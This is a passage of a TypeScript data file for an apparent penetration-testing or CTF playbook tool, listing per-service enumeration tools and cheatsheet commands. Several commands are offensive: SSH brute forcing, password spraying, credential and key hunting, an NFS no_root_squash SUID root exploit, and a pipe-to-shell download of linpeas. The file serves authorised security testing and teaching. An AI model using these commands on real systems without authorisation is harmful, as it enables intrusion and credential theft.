import type { CheatsheetEntry, KnowledgeItem, ToolReference } from "./types";

export interface PlaybookMetadataEnrichment {
  readonly subtitle: string;
  readonly about: string;
  readonly tags: readonly string[];
  readonly tools: readonly ToolReference[];
  readonly cheatsheet: readonly CheatsheetEntry[];
  readonly relatedSlugs: readonly string[];
  readonly activationRuleExplanation: string;
}

export const playbookEnrichments: Record<string, PlaybookMetadataEnrichment> = {
  http: {
    subtitle: "Web service reconnaissance, endpoint discovery, and web vulnerability analysis",
    about:
      "HTTP (Hypertext Transfer Protocol) is the ubiquitous protocol for web applications, APIs, and portals. In penetration testing and CTFs, HTTP services present the largest attack surface due to custom code, third-party frameworks, authentication endpoints, and misconfigurations.",
    tags: ["Web", "Enumeration", "Reconnaissance", "Initial Access", "OWASP"],
    tools: [
      {
        name: "nmap",
        category: "Network Scanner",
        purpose: "Detect HTTP version, banners, SSL certificates, and run NSE HTTP scripts",
        commonCommands: [
          "nmap -p 80,443 -sC -sV $TARGET",
          "nmap -p 80 --script http-enum,http-headers,http-methods $TARGET",
        ],
      },
      {
        name: "curl",
        category: "HTTP Client",
        purpose: "Inspect raw response headers, status codes, and test endpoints",
        commonCommands: [
          "curl -i -s http://$TARGET/",
          "curl -i -X OPTIONS http://$TARGET/",
          "curl -k -I https://$TARGET/",
        ],
      },
      {
        name: "ffuf",
        category: "Fuzzer",
        purpose: "High-performance web fuzzing for directory, file, and parameter discovery",
        commonCommands: [
          "ffuf -u http://$TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403",
          "ffuf -u http://$TARGET/index.php?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 1234",
        ],
      },
      {
        name: "gobuster",
        category: "Directory Fuzzer",
        purpose: "Fast brute force of URI paths, files, and virtual hosts in Go",
        commonCommands: [
          "gobuster dir -u http://$TARGET/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak",
        ],
      },
      {
        name: "whatweb",
        category: "Technology Identifier",
        purpose: "Identify web technologies, CMS versions, scripting platforms, and analytics",
        commonCommands: ["whatweb http://$TARGET/"],
      },
      {
        name: "nikto",
        category: "Vulnerability Scanner",
        purpose: "Quick identification of dangerous files, default scripts, and outdated software",
        commonCommands: ["nikto -h http://$TARGET"],
      },
    ],
    cheatsheet: [
      {
        title: "Basic Header & Banner Inspection",
        command: "curl -i -L http://$TARGET/",
        description: "Retrieves complete response headers, following redirects (-L), revealing server tokens and cookie attributes.",
      },
      {
        title: "Content & Extension Discovery with Gobuster",
        command: "gobuster dir -u http://$TARGET/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt,json,bak -t 30",
        description: "Scans for common endpoints and backup files that may leak source code or configuration secrets.",
      },
      {
        title: "Virtual Host Brute Forcing with FFUF",
        command: "ffuf -u http://$TARGET/ -H 'Host: FUZZ.$DOMAIN' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 285",
        description: "Fuzzes the Host header to discover hidden subdomains or internal sites on the same IP. Filter size (-fs) with baseline size.",
      },
      {
        title: "Nmap HTTP Scripts Suite",
        command: "nmap -p 80,443,8080 --script http-title,http-headers,http-robots.txt,http-webdav-scan $TARGET",
        description: "Executes standard NSE scripts to extract page titles, robots.txt, and dangerous WebDAV methods.",
      },
    ],
    relatedSlugs: ["content-discovery", "vhost-discovery", "credential-analysis", "ssh"],
    activationRuleExplanation: "Automatically activates when confirmed evidence identifies 'service:http' or 'protocol:https'.",
  },

  ssh: {
    subtitle: "Secure Shell service enumeration, key auditing, and authentication analysis",
    about:
      "SSH (Secure Shell) provides encrypted remote administration on TCP port 22. In CTFs and penetration testing, SSH itself is rarely vulnerable to remote code execution; rather, it serves as a critical authentication vector using discovered credentials, private keys, or known default configurations.",
    tags: ["Services", "Remote Access", "Linux", "Authentication", "Reconnaissance"],
    tools: [
      {
        name: "nmap",
        category: "Network Scanner",
        purpose: "Identify OpenSSH banner, supported authentication algorithms, and host keys",
        commonCommands: [
          "nmap -p 22 -sV -sC $TARGET",
          "nmap -p 22 --script ssh-auth-methods,ssh2-enum-algos $TARGET",
        ],
      },
      {
        name: "ssh",
        category: "Remote Access",
        purpose: "Connect to target using discovered passwords, private keys, or legacy algorithms",
        commonCommands: [
          "ssh user@$TARGET",
          "ssh -i id_rsa user@$TARGET",
          "ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa -i id_rsa user@$TARGET",
        ],
      },
      {
        name: "hydra",
        category: "Brute Force",
        purpose: "Targeted authentication testing when credentials or wordlists are available",
        commonCommands: [
          "hydra -l root -P passwords.txt ssh://$TARGET -t 4",
        ],
      },
    ],
    cheatsheet: [
      {
        title: "Inspect Supported Auth Methods",
        command: "ssh -v user@$TARGET -o PreferredAuthentications=none",
        description: "Forces SSH client to print available authentication methods (password, publickey, keyboard-interactive) without logging in.",
      },
      {
        title: "Fix RSA Private Key Permissions",
        command: "chmod 600 id_rsa && ssh -i id_rsa user@$TARGET",
        description: "Sets correct restrictive permissions on private key files to prevent SSH client from refusing connections.",
      },
      {
        title: "Legacy Cipher Compatibility",
        command: "ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa -i id_rsa user@$TARGET",
        description: "Enables legacy RSA keys on newer OpenSSH clients that have disabled SHA-1 RSA by default.",
      },
    ],
    relatedSlugs: ["credential-analysis", "linux-post-exploitation", "password-spraying"],
    activationRuleExplanation: "Automatically activates when confirmed evidence identifies 'service:ssh' on the target.",
  },

  smb: {
    subtitle: "Server Message Block share enumeration, null session audit, and RPC recon",
    about:
      "SMB (Server Message Block) on ports 445 and 139 provides network file sharing, printer sharing, and IPC communication. Misconfigured guest accounts, null sessions, and exposed readable shares frequently leak sensitive configuration files, backup databases, or administrator credentials.",
    tags: ["Services", "Windows", "File Sharing", "Enumeration", "Active Directory"],
    tools: [
      {
        name: "smbclient",
        category: "File Sharing",
        purpose: "List and interact with SMB shares using null sessions, guest, or credentials",
        commonCommands: [
          "smbclient -L //$TARGET/ -N",
          "smbclient //$TARGET/share -N",
          "smbclient -U 'user%password' //$TARGET/share",
        ],
      },
      {
        name: "crackmapexec",
        category: "Active Directory / SMB",
        purpose: "Enumerate shares, password spray, check signing, and execute commands",
        commonCommands: [
          "crackmapexec smb $TARGET -u '' -p '' --shares",
          "crackmapexec smb $TARGET -u 'guest' -p '' --shares",
          "crackmapexec smb $TARGET -u users.txt -p passwords.txt",
        ],
      },
      {
        name: "enum4linux-ng",
        category: "Enumeration",
        purpose: "Comprehensive enumeration of users, groups, shares, and password policies",
        commonCommands: ["enum4linux-ng -A $TARGET"],
      },
      {
        name: "smbget",
        category: "Data Transfer",
        purpose: "Recursively download entire share contents for offline analysis",
        commonCommands: ["smbget -R smb://$TARGET/share -N"],
      },
    ],
    cheatsheet: [
      {
        title: "Anonymous / Null Session Share Listing",
        command: "smbclient -L //$TARGET/ -N",
        description: "Lists all available shares using null authentication without prompting for password.",
      },
      {
        title: "CrackMapExec Share Audit",
        command: "crackmapexec smb $TARGET -u '' -p '' --shares",
        description: "Checks whether null or guest access is allowed and displays READ/WRITE permissions on each share.",
      },
      {
        title: "Recursive Share Download",
        command: "smbclient //$TARGET/share -N -c 'prompt OFF; recurse ON; mget *'",
        description: "Connects to an open share and recursively downloads all files to the current directory for grep inspection.",
      },
    ],
    relatedSlugs: ["credential-analysis", "windows-post-exploitation", "ldap"],
    activationRuleExplanation: "Automatically activates when confirmed evidence identifies 'service:smb' or ports 445/139.",
  },

  ftp: {
    subtitle: "File Transfer Protocol anonymous login verification, directory review, and bounce testing",
    about:
      "FTP (File Transfer Protocol) operates on port 21 for transferring files. In CTF scenarios, anonymous FTP access frequently allows reading web source code, database dumps, or SSH keys, and write permissions can allow uploading web shells or executable scripts.",
    tags: ["Services", "File Sharing", "Reconnaissance", "Initial Access"],
    tools: [
      {
        name: "ftp",
        category: "FTP Client",
        purpose: "Interactive FTP command-line client for browsing and downloading files",
        commonCommands: ["ftp $TARGET"],
      },
      {
        name: "nmap",
        category: "Network Scanner",
        purpose: "Run NSE scripts for anonymous access and banner enumeration",
        commonCommands: ["nmap -p 21 --script ftp-anon,ftp-syst,ftp-bounce $TARGET"],
      },
      {
        name: "wget",
        category: "Download Utility",
        purpose: "Recursive anonymous FTP download",
        commonCommands: ["wget -m ftp://anonymous:anonymous@$TARGET/"],
      },
    ],
    cheatsheet: [
      {
        title: "Anonymous FTP Quick Check with Nmap",
        command: "nmap -p 21 --script ftp-anon $TARGET",
        description: "Checks if anonymous login is enabled and lists the top-level directory contents automatically.",
      },
      {
        title: "Recursive Mirror Download via Wget",
        command: "wget -m ftp://anonymous:anonymous@$TARGET/",
        description: "Mirrors the entire FTP server contents locally for grep analysis and file inspection.",
      },
      {
        title: "Test File Upload Permissions",
        command: "curl -T test.txt ftp://$TARGET/ --user anonymous:anonymous",
        description: "Verifies if the FTP root or directories permit file upload, a common vector for uploading web shells.",
      },
    ],
    relatedSlugs: ["http", "credential-analysis"],
    activationRuleExplanation: "Automatically activates when confirmed evidence identifies 'service:ftp' on port 21.",
  },

  dns: {
    subtitle: "Domain Name System zone transfers, subdomains, and DNS record reconnaissance",
    about:
      "DNS (Domain Name System) on port 53 maps domain names to IP addresses. Improperly configured DNS servers allowing unauthenticated AXFR zone transfers leak the target's entire infrastructure layout, internal hostnames, and staging servers.",
    tags: ["Services", "Network", "Reconnaissance", "DNS"],
    tools: [
      {
        name: "dig",
        category: "DNS Utility",
        purpose: "Query DNS records (A, AAAA, MX, TXT, CNAME, NS) and request AXFR zone transfers",
        commonCommands: [
          "dig @$TARGET $DOMAIN ANY",
          "dig @$TARGET $DOMAIN axfr",
        ],
      },
      {
        name: "nslookup",
        category: "DNS Utility",
        purpose: "Interactive query of DNS records across platforms",
        commonCommands: ["nslookup -type=any $DOMAIN $TARGET"],
      },
      {
        name: "dnsrecon",
        category: "DNS Scanner",
        purpose: "Automate zone transfers, reverse lookup, and standard subdomain enumeration",
        commonCommands: ["dnsrecon -d $DOMAIN -n $TARGET -t axfr"],
      },
    ],
    cheatsheet: [
      {
        title: "AXFR Full Zone Transfer Request",
        command: "dig @$TARGET $DOMAIN axfr",
        description: "Requests a complete replication of all DNS records for the specified domain from the target nameserver.",
      },
      {
        title: "Query TXT & SPF Records",
        command: "dig @$TARGET $DOMAIN TXT +short",
        description: "Inspects TXT records which frequently leak verification codes, cloud services, and email routing hints.",
      },
      {
        title: "Reverse DNS Sweep",
        command: "dnsrecon -r 10.10.10.0/24 -n $TARGET",
        description: "Performs PTR record lookups for the target subnet to discover hostnames associated with internal IPs.",
      },
    ],
    relatedSlugs: ["vhost-discovery", "http"],
    activationRuleExplanation: "Automatically activates when confirmed evidence identifies 'service:dns' on port 53.",
  },

  snmp: {
    subtitle: "Simple Network Management Protocol community string brute forcing and MIB tree walking",
    about:
      "SNMP (Simple Network Management Protocol) on UDP 161 monitors network devices, servers, and services. Default community strings ('public', 'private') expose hardware specs, running processes, open network connections, and system user lists.",
    tags: ["Services", "Network", "Enumeration", "SNMP"],
    tools: [
      {
        name: "snmpwalk",
        category: "SNMP Utility",
        purpose: "Recursively query MIB objects for users, processes, software, and interfaces",
        commonCommands: [
          "snmpwalk -v2c -c public $TARGET",
          "snmpwalk -v2c -c public $TARGET hrSWRunName",
        ],
      },
      {
        name: "onesixtyone",
        category: "SNMP Scanner",
        purpose: "Fast brute force of common SNMP community strings",
        commonCommands: ["onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $TARGET"],
      },
      {
        name: "snmp-check",
        category: "SNMP Enumeration",
        purpose: "Pretty-print system info, user accounts, network routes, and storage from SNMP",
        commonCommands: ["snmp-check $TARGET -c public"],
      },
    ],
    cheatsheet: [
      {
        title: "Brute Force Community Strings",
        command: "onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $TARGET",
        description: "Rapidly identifies valid SNMP v1/v2c community strings on UDP port 161.",
      },
      {
        title: "Comprehensive Walk of Running Processes",
        command: "snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.25.4.2.1.2",
        description: "Queries the HOST-RESOURCES MIB to extract the names of all currently executing processes.",
      },
    ],
    relatedSlugs: ["credential-analysis", "linux-post-exploitation"],
    activationRuleExplanation: "Automatically activates when confirmed evidence identifies 'service:snmp' on UDP 161.",
  },

  ldap: {
    subtitle: "Lightweight Directory Access Protocol naming contexts, user queries, and Active Directory objects",
    about:
      "LDAP (Lightweight Directory Access Protocol) on port 389/636 manages directory services such as Active Directory and OpenLDAP. Anonymous binding or domain user access allows querying users, group memberships, service accounts (SPNs), and descriptions containing passwords.",
    tags: ["Services", "Active Directory", "Windows", "Enumeration", "LDAP"],
    tools: [
      {
        name: "ldapsearch",
        category: "Directory Query",
        purpose: "Query directory schemas, naming contexts, users, and groups via LDAP",
        commonCommands: [
          "ldapsearch -x -H ldap://$TARGET -s base namingcontexts",
          "ldapsearch -x -H ldap://$TARGET -b 'DC=example,DC=com' '(objectClass=person)'",
        ],
      },
      {
        name: "nmap",
        category: "Network Scanner",
        purpose: "NSE scripts for LDAP naming contexts and root DSE inspection",
        commonCommands: ["nmap -p 389 --script ldap-rootdse,ldap-search $TARGET"],
      },
    ],
    cheatsheet: [
      {
        title: "Discover Base Naming Contexts (Root DSE)",
        command: "ldapsearch -x -H ldap://$TARGET -s base namingcontexts",
        description: "Finds the default directory partition (e.g. DC=corp,DC=local) required for subsequent user queries.",
      },
      {
        title: "Query All User Objects and Descriptions",
        command: "ldapsearch -x -H ldap://$TARGET -b '$BASE_DN' '(objectClass=user)' sAMAccountName description",
        description: "Extracts usernames and description fields which frequently store temporary or default passwords.",
      },
    ],
    relatedSlugs: ["smb", "windows-post-exploitation", "password-spraying"],
    activationRuleExplanation: "Automatically activates when confirmed evidence identifies 'service:ldap' on port 389 or 636.",
  },

  nfs: {
    subtitle: "Network File System export listing, root squashing audit, and remote mount inspection",
    about:
      "NFS (Network File System) on port 2049 allows mounting remote file systems over the network. Misconfigured exports with 'no_root_squash' allow client root users to create SUID binaries on the remote share, leading directly to privilege escalation.",
    tags: ["Services", "File Sharing", "Linux", "NFS", "Privesc"],
    tools: [
      {
        name: "showmount",
        category: "NFS Utility",
        purpose: "Query remote mount daemon to list exported directories and access permissions",
        commonCommands: ["showmount -e $TARGET"],
      },
      {
        name: "mount",
        category: "System Utility",
        purpose: "Mount remote NFS export locally into a temporary directory",
        commonCommands: ["mount -t nfs -o nolock $TARGET:/export /mnt/nfs"],
      },
    ],
    cheatsheet: [
      {
        title: "List Exported Shares",
        command: "showmount -e $TARGET",
        description: "Displays all exported directories and allowed client IP ranges or wildcards (*).",
      },
      {
        title: "Mount Export to Local Directory",
        command: "mkdir -p /mnt/target && mount -t nfs -o nolock $TARGET:/shared /mnt/target",
        description: "Mounts the remote NFS share locally without locking, allowing direct file access.",
      },
      {
        title: "Exploit no_root_squash via SUID Binary",
        command: "cp /bin/bash /mnt/target/rootbash && chmod +s /mnt/target/rootbash",
        description: "If exported with no_root_squash, creating a SUID root binary on the mounted share enables instant root on target.",
      },
    ],
    relatedSlugs: ["linux-post-exploitation", "suid-privesc"],
    activationRuleExplanation: "Automatically activates when confirmed evidence identifies 'service:nfs' on port 2049.",
  },

  smtp: {
    subtitle: "Simple Mail Transfer Protocol user enumeration (VRFY, EXPN, RCPT TO) and open relay audit",
    about:
      "SMTP (Simple Mail Transfer Protocol) on port 25 routes email across networks. Commands such as VRFY and RCPT TO can be used to verify legitimate usernames for subsequent password spraying, and open relays allow sending phishing or test messages.",
    tags: ["Services", "Email", "Enumeration", "Reconnaissance"],
    tools: [
      {
        name: "nc",
        category: "Networking",
        purpose: "Direct raw socket interaction with SMTP banner and command prompt",
        commonCommands: ["nc -nv $TARGET 25"],
      },
      {
        name: "smtp-user-enum",
        category: "Enumeration",
        purpose: "Automate username verification using VRFY, EXPN, or RCPT TO methods",
        commonCommands: ["smtp-user-enum -M VRFY -U users.txt -t $TARGET"],
      },
    ],
    cheatsheet: [
      {
        title: "Test Username with VRFY",
        command: "nc -nv $TARGET 25\nVRFY root\nVRFY admin",
        description: "Sends VRFY commands to check if specific usernames exist on the target mail server.",
      },
      {
        title: "Automate User Discovery",
        command: "smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $TARGET",
        description: "Tests recipient addresses via RCPT TO to map valid local system accounts.",
      },
    ],
    relatedSlugs: ["password-spraying", "credential-analysis"],
    activationRuleExplanation: "Automatically activates when confirmed evidence identifies 'service:smtp' on port 25.",
  },

  "linux-post-exploitation": {
    subtitle: "Linux privilege escalation, credential harvesting, SUID auditing, and capability discovery",
    about:
      "Linux Post-Exploitation begins once low-privilege shell access is achieved. The objective is systematic situational awareness: identifying the Linux distribution, kernel version, sudo permissions, SUID binaries, cron jobs, writable files, and active internal services to escalate to root.",
    tags: ["Post Exploitation", "Linux", "Privesc", "Privilege Escalation"],
    tools: [
      {
        name: "linpeas.sh",
        category: "Privilege Escalation Scanner",
        purpose: "Automated comprehensive script searching for misconfigurations, SUIDs, credentials, and kernel CVEs",
        commonCommands: ["curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"],
      },
      {
        name: "pspy",
        category: "Process Snooper",
        purpose: "Monitor Linux processes in real-time without root permissions to catch cron jobs and dynamic scripts",
        commonCommands: ["./pspy64 -pf -i 1000"],
      },
      {
        name: "sudo",
        category: "System Utility",
        purpose: "Check current user sudo permissions without password or with known password",
        commonCommands: ["sudo -l"],
      },
    ],
    cheatsheet: [
      {
        title: "Quick Sudo Permission Check",
        command: "sudo -l",
        description: "Displays the commands current user is allowed to execute as root or other users, checking GTFOBins for bypasses.",
      },
      {
        title: "Audit SUID Binaries",
        command: "find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \\;",
        description: "Scans entire filesystem for binaries with the SetUID bit enabled that execute with owner (root) privileges.",
      },
      {
        title: "Search for Passwords in Configs and Logs",
        command: "grep -rnwi 'password' /var/www/ /etc/ /opt/ 2>/dev/null | head -n 30",
        description: "Searches web server directories and configurations for hardcoded database credentials or tokens.",
      },
      {
        title: "Inspect System Capabilities",
        command: "getcap -r / 2>/dev/null",
        description: "Identifies binaries with special Linux capabilities (e.g. cap_setuid, cap_net_raw) that can lead to root.",
      },
    ],
    relatedSlugs: ["sudo-privesc", "suid-privesc", "linux-capabilities", "cron-privesc"],
    activationRuleExplanation: "Activates during the Post-Exploitation phase when target system is confirmed as Linux.",
  },

  "windows-post-exploitation": {
    subtitle: "Windows privilege escalation, token privileges, unquoted service paths, and credential dumping",
    about:
      "Windows Post-Exploitation focuses on situational awareness inside a Windows host. Vectors include inspecting user token privileges (SeImpersonate, SeBackup), unquoted service paths, weak service binary permissions, AlwaysInstallElevated registry keys, and credential stores.",
    tags: ["Post Exploitation", "Windows", "Privesc", "Privilege Escalation", "Active Directory"],
    tools: [
      {
        name: "winpeas.exe / .bat",
        category: "Privilege Escalation Scanner",
        purpose: "Automated scanner for Windows misconfigurations, tokens, registry keys, and credentials",
        commonCommands: ["winPEASx64.exe"],
      },
      {
        name: "whoami",
        category: "System Utility",
        purpose: "Display current username and list assigned security token privileges and group memberships",
        commonCommands: ["whoami /all", "whoami /priv"],
      },
      {
        name: "Seatbelt",
        category: "Security Auditor",
        purpose: "C# tool for security-oriented situational awareness and system auditing",
        commonCommands: ["Seatbelt.exe -group=system -group=user"],
      },
    ],
    cheatsheet: [
      {
        title: "Inspect Token Privileges",
        command: "whoami /priv",
        description: "Checks if dangerous privileges like SeImpersonatePrivilege or SeDebugPrivilege are enabled for token manipulation.",
      },
      {
        title: "Unquoted Service Path Scan",
        command: "wmic service get name,displayname,pathname,startmode | findstr /i \"Auto\" | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\"",
        description: "Locates automated services whose binary paths contain spaces and lack quotes, permitting binary hijacking.",
      },
      {
        title: "Check AlwaysInstallElevated Registry Keys",
        command: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
        description: "If both keys are set to 1 (0x1), MSI installers always execute with elevated SYSTEM authority.",
      },
    ],
    relatedSlugs: ["service-misconfig", "smb", "ldap"],
    activationRuleExplanation: "Activates during the Post-Exploitation phase when target system is confirmed as Windows.",
  },

  generic: {
    subtitle: "Deterministic enumeration playbook for non-standard, custom, or unrecognized network ports",
    about:
      "The Generic Service Enumeration playbook acts as the universal baseline fallback when an open TCP/UDP port does not match standard protocols (e.g. unknown daemon, custom socket, or proprietary protocol). It provides structured checks to fingerprint the banner, test transport security, probe protocol framing, and audit authentication without assuming specific software.",
    tags: ["Services", "Reconnaissance", "Fallback", "Fingerprinting"],
    tools: [
      {
        name: "nc (netcat)",
        category: "Networking",
        purpose: "Send raw text probes and inspect raw response streams",
        commonCommands: ["nc -nv $TARGET $PORT"],
      },
      {
        name: "nmap",
        category: "Network Scanner",
        purpose: "Run service version intensity scanning and probe databases",
        commonCommands: ["nmap -p $PORT -sV --version-all $TARGET"],
      },
      {
        name: "openssl",
        category: "TLS/SSL Client",
        purpose: "Test if the service requires or supports TLS encryption",
        commonCommands: ["openssl s_client -connect $TARGET:$PORT"],
      },
    ],
    cheatsheet: [
      {
        title: "Full Version Intensity Scan",
        command: "nmap -p $PORT -sV --version-intensity 9 $TARGET",
        description: "Uses all Nmap service fingerprinting probes against the port to identify obscure protocols.",
      },
      {
        title: "Test TLS / SSL Handshake",
        command: "openssl s_client -connect $TARGET:$PORT -quiet",
        description: "Tests whether the port speaks encrypted TLS and extracts the SSL certificate details.",
      },
    ],
    relatedSlugs: ["http", "ssh"],
    activationRuleExplanation: "Automatically activates for any confirmed open port that does not match a specialized native playbook.",
  },
};

export const standaloneTechniques: readonly KnowledgeItem[] = [
  {
    id: "tech-content-discovery",
    slug: "content-discovery",
    title: "Content & Directory Discovery",
    subtitle: "Systematic enumeration of web directories, files, hidden endpoints, and backup artifacts",
    description: "Brute-forcing and wordlist-based enumeration of unlinked resources, administrative portals, and configuration files.",
    about:
      "Content Discovery is one of the most reliable initial access vectors in web penetration testing. Web applications frequently contain unpublished administrative panels, test scripts, documentation, and backup files (.bak, .old, .zip, .swp) that are not linked from the main user interface. Using specialized wordlists (such as SecLists) and fast fuzzing tools exposes these hidden resources.",
    category: "techniques",
    targetPhase: "reconnaissance",
    tags: ["Web", "Fuzzing", "Reconnaissance", "Wordlists"],
    tools: [
      {
        name: "ffuf",
        category: "Fuzzer",
        purpose: "High-speed web fuzzer with advanced status and response-size filtering",
        commonCommands: ["ffuf -u http://$TARGET/FUZZ -w wordlist.txt -mc 200,301,302,403"],
      },
      {
        name: "gobuster",
        category: "Fuzzer",
        purpose: "Reliable directory and file brute forcing with file extensions support",
        commonCommands: ["gobuster dir -u http://$TARGET/ -w wordlist.txt -x php,txt,html,json"],
      },
      {
        name: "feroxbuster",
        category: "Recursive Fuzzer",
        purpose: "Blazing fast Rust-based recursive directory discovery",
        commonCommands: ["feroxbuster -u http://$TARGET/ -w wordlist.txt -x php,txt"],
      },
    ],
    cheatsheet: [
      {
        title: "Standard Directory Fuzzing",
        command: "ffuf -u http://$TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403",
        description: "Scans for standard directory names, matching on success and redirect status codes.",
      },
      {
        title: "Backup & Source Code Discovery",
        command: "ffuf -u http://$TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.php.bak,.zip,.tar.gz,.swp,.txt",
        description: "Discovers forgotten backup archives and editor swap files that leak server-side code.",
      },
    ],
    relatedSlugs: ["http", "vhost-discovery"],
    checks: [
      {
        semanticKey: "technique.content-discovery.baseline-crawl",
        title: "Establish baseline response size and common redirects",
        description: "Send standard 404 requests to calibrate response filtering parameters (filter size, words, lines).",
        priority: "required",
        sortOrder: 1,
      },
      {
        semanticKey: "technique.content-discovery.standard-wordlist",
        title: "Fuzz directories using standard medium wordlist",
        description: "Execute wordlist fuzzing against root path to locate primary subdirectories and API routes.",
        priority: "required",
        sortOrder: 2,
      },
      {
        semanticKey: "technique.content-discovery.extensions",
        title: "Probe for platform-specific and backup extensions",
        description: "Include target language extensions (.php, .aspx, .jsp) and archival suffixes (.bak, .old, .zip).",
        priority: "recommended",
        sortOrder: 3,
      },
      {
        semanticKey: "technique.content-discovery.recursive-depth",
        title: "Recursively enumerate discovered directories",
        description: "Fuzz second-level paths discovered from the primary scan (e.g. /admin/FUZZ, /api/v1/FUZZ).",
        priority: "recommended",
        sortOrder: 4,
      },
    ],
  },
  {
    id: "tech-vhost-discovery",
    slug: "vhost-discovery",
    title: "Virtual Host Discovery",
    subtitle: "Host header fuzzing and subdomain enumeration against target web servers",
    description: "Identifying isolated web applications and internal administrative interfaces routed by Host headers.",
    about:
      "Web servers like Apache, Nginx, and IIS often host multiple domain names on a single physical IP address using Virtual Hosts. By manipulating the HTTP 'Host' header or querying local DNS nameservers, penetration testers can uncover unadvertised administrative consoles, development staging domains, or internal apps that are inaccessible through the default IP address.",
    category: "techniques",
    targetPhase: "reconnaissance",
    tags: ["Web", "DNS", "Reconnaissance", "Fuzzing"],
    tools: [
      {
        name: "ffuf",
        category: "Fuzzer",
        purpose: "Fuzz Host header while filtering baseline default page responses",
        commonCommands: ["ffuf -u http://$TARGET/ -H 'Host: FUZZ.$DOMAIN' -w subdomains.txt -fs 1234"],
      },
      {
        name: "gobuster vhost",
        category: "Fuzzer",
        purpose: "Dedicated virtual host brute forcing mode in gobuster",
        commonCommands: ["gobuster vhost -u http://$TARGET/ -w subdomains.txt --append-domain"],
      },
    ],
    cheatsheet: [
      {
        title: "Host Header Fuzzing with Baseline Filtering",
        command: "ffuf -u http://$TARGET/ -H 'Host: FUZZ.$DOMAIN' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs $BASELINE_SIZE",
        description: "Fuzzes virtual hosts. Important: First check response size with invalid host to set -fs filter size correctly.",
      },
      {
        title: "Add Discovered VHost to /etc/hosts",
        command: "echo '$TARGET admin.$DOMAIN dev.$DOMAIN' | sudo tee -a /etc/hosts",
        description: "Maps discovered virtual hosts locally so browsers and proxies can route requests accurately.",
      },
    ],
    relatedSlugs: ["http", "dns", "content-discovery"],
    checks: [
      {
        semanticKey: "technique.vhost-discovery.baseline-size",
        title: "Determine default virtual host response length",
        description: "Send request with random non-existent host header (e.g. random123.domain) and note byte size.",
        priority: "required",
        sortOrder: 1,
      },
      {
        semanticKey: "technique.vhost-discovery.subdomain-fuzz",
        title: "Execute Host header fuzzing with filtered size",
        description: "Run wordlist fuzzing against the Host header while excluding the baseline response size.",
        priority: "required",
        sortOrder: 2,
      },
      {
        semanticKey: "technique.vhost-discovery.update-hosts",
        title: "Update local hosts resolution for valid findings",
        description: "Map all confirmed virtual hosts in /etc/hosts to enable comprehensive application inspection.",
        priority: "required",
        sortOrder: 3,
      },
    ],
  },
  {
    id: "tech-credential-analysis",
    slug: "credential-analysis",
    title: "Credential Analysis & Extraction",
    subtitle: "Identification, extraction, and verification of passwords, hashes, and API secrets",
    description: "Methods for locating credentials in config files, source code repositories, memory dumps, and logs.",
    about:
      "Credentials represent the bridge between reconnaissance, initial access, and privilege escalation. Rather than exploiting complex memory vulnerabilities, real-world attackers and CTF players frequently achieve objectives by extracting hardcoded database passwords from configuration files, recovering unshadowed password hashes, or discovering reusable SSH keys.",
    category: "techniques",
    targetPhase: "vulnerability-analysis",
    tags: ["Credentials", "Reconnaissance", "Privesc", "Authentication"],
    tools: [
      {
        name: "grep",
        category: "System Utility",
        purpose: "Recursive string matching for password, token, and secret patterns",
        commonCommands: ["grep -rnwi 'password' /var/www/ 2>/dev/null"],
      },
      {
        name: "hashid / hash-identifier",
        category: "Hash Identification",
        purpose: "Determine algorithm and format of discovered cryptographic hashes",
        commonCommands: ["hashid '$HASH'"],
      },
    ],
    cheatsheet: [
      {
        title: "Find Configuration and Database Credentials",
        command: "grep -rnwiE 'password|secret|db_pass|token' /var/www/ 2>/dev/null | head -n 30",
        description: "Extracts configuration parameters containing credentials in web roots.",
      },
      {
        title: "Find Readable Key Files",
        command: "find / -name '*.id_rsa' -o -name 'id_rsa' -o -name '*.kdbx' -o -name '*.ovpn' 2>/dev/null",
        description: "Searches for private SSH keys, KeePass password databases, and VPN configuration profiles.",
      },
    ],
    relatedSlugs: ["password-spraying", "hash-cracking", "ssh", "linux-post-exploitation"],
    checks: [
      {
        semanticKey: "technique.credential-analysis.identify-source",
        title: "Document exact source file and context of credential",
        description: "Record the file path, line number, or HTTP endpoint where the credential was observed.",
        priority: "required",
        sortOrder: 1,
      },
      {
        semanticKey: "technique.credential-analysis.hash-identification",
        title: "Classify hash algorithm if cryptographic format",
        description: "Determine whether the string is MD5, SHA-256, bcrypt, NTLM, or Argon2 before cracking.",
        priority: "recommended",
        sortOrder: 2,
      },
      {
        semanticKey: "technique.credential-analysis.test-reusability",
        title: "Test credential across confirmed target services",
        description: "Test discovered credentials against SSH, SMB, web portals, and local system accounts.",
        priority: "required",
        sortOrder: 3,
      },
    ],
  },
  {
    id: "tech-password-spraying",
    slug: "password-spraying",
    title: "Password Spraying & Brute Force",
    subtitle: "Low-and-slow authentication testing across multiple accounts to avoid lockouts",
    description: "Techniques for testing common passwords across confirmed usernames without triggering account lockout policies.",
    about:
